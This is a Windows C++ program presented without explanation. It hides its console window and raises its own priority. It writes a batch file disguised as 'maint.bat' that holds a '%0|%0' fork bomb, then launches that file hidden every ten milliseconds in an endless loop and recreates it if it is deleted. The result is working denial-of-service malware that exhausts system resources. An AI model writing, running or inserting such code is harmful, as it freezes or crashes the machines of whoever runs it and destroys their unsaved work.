#include <windows.h>
#include <string>
#include <fstream>

std::string GetExeDir() {
    char buf[MAX_PATH];
    GetModuleFileNameA(NULL, buf, MAX_PATH);
    std::string path(buf);
    size_t pos = path.find_last_of("\\/");
    return (pos != std::string::npos) ? path.substr(0, pos + 1) : "";
}

bool CreateBatFile(const std::string& batPath) {
    std::ofstream f(batPath, std::ios::trunc);
    if (!f.is_open()) return false;
    f << "%0|%0\r\n";
    f.close();
    return true;
}

void SpawnBat(const std::string& batPath) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    std::string cmd = "cmd.exe /c \"" + batPath + "\"";
    char* cmdBuf = new char[cmd.size() + 1];
    strcpy(cmdBuf, cmd.c_str());

    if (CreateProcessA(NULL, cmdBuf, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    delete[] cmdBuf;
}

void HardenProcess() {
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetProcessShutdownParameters(0x4FF, SHUTDOWN_NORETRY);
    HANDLE h1 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    HANDLE h2 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    (void)h1; (void)h2;
}

int main() {
    FreeConsole();
    HardenProcess();
    std::string exeDir = GetExeDir();
    std::string batPath = exeDir + "maint.bat";
    CreateBatFile(batPath);
    while (true) {
        if (GetFileAttributesA(batPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
            CreateBatFile(batPath);
        }
        SpawnBat(batPath);
        Sleep(10);
    }
    return 0;
}
